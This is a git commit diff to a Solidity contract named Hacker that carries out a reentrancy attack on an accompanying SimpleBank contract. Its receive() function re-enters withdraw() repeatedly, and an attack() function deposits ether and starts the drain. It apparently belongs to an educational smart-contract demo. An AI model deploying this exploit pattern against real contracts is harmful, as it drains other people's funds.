4a62b1b2a2654d8cf25971938e29d11c89a481b3
Paramet Kongjaroen <43013637+parametprame@users.noreply.github.com>
2022-10-04 13:30:50 +0700

    Update Hacker.sol

--- smartcontract/contracts/Hacker.sol
+++ smartcontract/contracts/Hacker.sol
@@ -4,35 +4,24 @@ pragma solidity ^0.8.0;
 
 import "./SimpleBank.sol";
 
-
 contract Hacker {
-    
-    SimpleBank public simpleBank;
 
+    SimpleBank public  simpleBank;
 
-    constructor(address _simpleBankAdrress) {
-        simpleBank = SimpleBank(_simpleBankAdrress);
+    constructor(address _simpleBankAddress) {
+        simpleBank = SimpleBank(_simpleBankAddress);
     }
 
-    receive() external payable {
-        if (address(simpleBank).balance >= 1 ether) {
+    receive() external  payable  {
+        if(address(simpleBank).balance >= 1 ether){
             simpleBank.withdraw();
         }
     }
-
-    function attack() external payable {
-        require(msg.value >= 1 ether);
-        simpleBank.deposit{value: 1 ether}();
-        simpleBank.withdraw();
-    }
-
     
-    function withdraw() public  {
-        
-        (bool sent,) = msg.sender.call{value: address(this).balance}("");
-
-        require(sent, "Failed to send Ether");
-        
+    function attack() public  payable  {
+        require(msg.value >= 1 ether);
+        simpleBank.deposit{value: msg.value}();
+        simpleBank.withdraw();   
     }
 
 }
